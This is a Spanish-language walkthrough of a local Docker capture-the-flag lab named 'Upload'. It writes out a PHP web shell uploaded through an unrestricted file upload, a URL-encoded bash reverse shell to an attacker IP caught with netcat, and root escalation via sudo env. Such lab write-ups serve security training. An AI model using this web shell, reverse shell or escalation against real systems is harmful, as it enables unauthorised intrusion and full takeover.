- Tags: #Upload
----
[Maquina Upload](https://mega.nz/file/pOdwgYbB#8lTyf-mWFNq7xvKWObKUV9gkrZj3nzhuHVlGQmnZ6BQ) ==> Enlace de descarga al laboratorio.
```bash
7z x upload.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh upload.tar # Desplegamos el contenedor.
```

#### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target.
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conectividad con el target.

wichSystem.py 172.17.0.2 # Deteminamos que nos estamos enfrentando ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

#### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos escaneo de puertos.
extractPorts allPorts # Parseamos la informacion mas importante del primer escaneo
nmap -sC -sV -p80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar la version y servicio que corren detras de estos puertos.
```

#### Fase Reconocimiento Web:
**( 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu)) )** ==> Tenemos un servicio de apache desplegado.
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

**( http://172.17.0.2/ )** ==> Tenemos esta web que nos permite subir archivos.
**( http://172.17.0.2/uploads/ )** ==> Tenemos esta ruta donde posiblemente se almacenen los archivos cargados
[PHP Extensions](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt) ==> Crearemos un archivo php que intentaremos subir y probaremos con ciertas extensiones para poder ver si podemos ejecutar codigo. El archivo que subimos contendra lo siguiente.
```php
# cmd.php
<?php
	system($_GET["cmd"]);
?<
```

**( http://172.17.0.2/uploads/cmd.php?cmd=whoami )** ==> Cargamos el archivo y ejecutamos el siguiente comando. Biendo que en la respuesta tendremos: **( www-data )**

#### Fase Intrusion:
```bash
nc -nlvp 443

http://172.17.0.2/uploads/cmd.php?cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E/dev/tcp/192.168.100.22/443%20%3C%261%27 # Ganamos acceso al target
```

#### Fase Escalada Privilegio:
```bash
whoami # Estamos como www-data
hostname -I # Estamos en 172.17.0.2 IP del target
```

```bash
sudo -l

User www-data may run the following commands on 518be55b1e6d:
    (root) NOPASSWD: /usr/bin/env  # Tenemos una via potencial de elevar privilegios.

sudo -u root /usr/bin/env bash -p # Elevamos privilegios de root teniendo control total sobre el target.
```

